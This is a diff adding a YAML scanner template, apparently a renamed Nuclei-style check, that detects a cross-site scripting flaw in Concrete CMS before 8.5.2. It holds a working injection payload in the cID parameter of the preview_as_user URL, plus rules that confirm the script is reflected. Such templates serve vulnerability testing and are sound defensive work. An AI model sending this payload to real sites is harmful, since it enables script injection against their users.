@@ -1,0 +1,34 @@
+id: concrete-xss
+brief:
+    title: Concrete CMS <8.5.2 - Cross-Site Scripting
+    by: shifacyclewla
+    level: high
+    about: Concrete CMS before 8.5.2 contains a cross-site scripting vulnerability in preview_as_user function using cID parameter.
+    label:
+        - hackerone
+        - concrete
+        - xss
+        - cms
+        - unauth
+        - intrusive
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/ccm/system/panels/page/preview_as_user/preview?cID="></iframe><svg/onload=alert("{{randstr}}")>'
+      signs:
+        - "on": word
+          has:
+            - </iframe><svg/onload=alert("{{randstr}}")>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+            - CONCRETE5
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
